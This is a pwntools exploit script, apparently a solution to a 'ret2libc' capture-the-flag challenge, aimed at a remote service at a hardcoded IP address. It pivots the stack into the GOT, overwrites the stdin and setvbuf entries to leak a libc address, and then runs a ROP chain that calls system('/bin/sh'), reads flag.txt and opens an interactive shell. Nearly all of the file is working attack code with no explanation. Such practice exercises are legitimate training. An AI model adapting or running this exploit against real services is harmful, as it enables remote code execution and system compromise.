#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from ctypes import CDLL
import sys, random
from time import sleep

context.arch = 'amd64'
context.os = 'linux'

exe = '../ret2libc/ret2libc'
port = 30173

elf = ELF(exe)
off_main = elf.symbols[b'main']
libc = elf.libc
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('140.113.24.241', port)

"""
-------- GOT --------
0x404018: puts@glibc
0x404020: read@glibc
0x404028: setvbuf@glibc -> hijacked to 0x404030 ( the original value in got entry of read 0x404020 )
...
...
0x404040: stdout@glibc   
0x404050: stdin@glibc   -> change to elf.plt['read']
...
...
0x404028 + 0x80         -> lower stack rbp
...
0x404050 + 0x80         -> overwrite stdin rbp
...
...
...
0x404ff0                -> stack top rbp
0x404fff                -> stack top
cannot access memory
cannot access memory
---------------------
"""

# change stack frames to GOT 
LEARAX_RBP80 = elf.sym['hackMe'] + 12   # address of lea rax, [rbp - 0x80]
STDIN = elf.got['stdin']
RBP = STDIN + 0X80

payload = flat(
    'A' * 128,
    p64(RBP).ljust(8, b'\x00'),             # Change rbp
    p64(LEARAX_RBP80).ljust(8, b'\x00'),    # return address
)
r.recvuntil(b'server!\n')
r.send(payload)
sleep(0.1)

# overwrite stdin
READ = elf.got['read']
SETVBUF = elf.got['setvbuf']
LOWER_STACK = SETVBUF + 0x80
STACK_TOP = 0x404fd0
RBP = STDIN + 0x80

payload = flat(
    p64(READ).ljust(8, b'\x00'),            # 0x404050 overwrite stdin
    '\0' * (LOWER_STACK - STDIN - 8),
    p64(STACK_TOP).ljust(8, b'\x00'),       # 0x404028 + 0x80 lower stack rbp
    p64(LEARAX_RBP80).ljust(8, b'\x00'),    # 0x404028 + 0x88 pre-write the return address
    '\0' * (RBP - LOWER_STACK - 0x10),
    p64(LOWER_STACK).ljust(8, b'\x00'),     # 0x404050 + 0x80 overwrite stdin rbp
    p64(LEARAX_RBP80).ljust(8, b'\x00')

)
r.send(payload)
sleep(0.1)

# overwrite setvbuf
RBP = LOWER_STACK
PUTS = 0x401030

payload = flat(
    p64(PUTS).ljust(8, b'\x00'),            # 0x404028 overwrite setvbuf
)
r.send(payload)
sleep(0.1)

# ret to main + 19
RBP = STACK_TOP
MOVRAX = 0x4011b3

payload = flat(
    '\0' * 0x80,
    'BBBBBBBB',
    p64(MOVRAX).ljust(8, b'\x00')
)
r.send(payload)
sleep(0.1)

# receive real read address
data = r.recv()
libc.address = u64(data.split(b'\n')[0].ljust(8, b'\x00')) - 0x1147d0
print(hex(libc.address))

# pwn
RET = 0x40101a
POPRDI = libc.address + 0x2a3e5

payload = flat(
    'A' * 136,
    p64(POPRDI).ljust(8, b'\x00'),
    next(libc.search(b'/bin/sh\x00')),
    p64(RET).ljust(8, b'\x00'),
    libc.sym['system'],
)

r.send(payload)
sleep(0.1)

# get flag
r.send(b'cat flag.txt\n')
flag = r.recv().decode()

success(flag)
r.interactive()
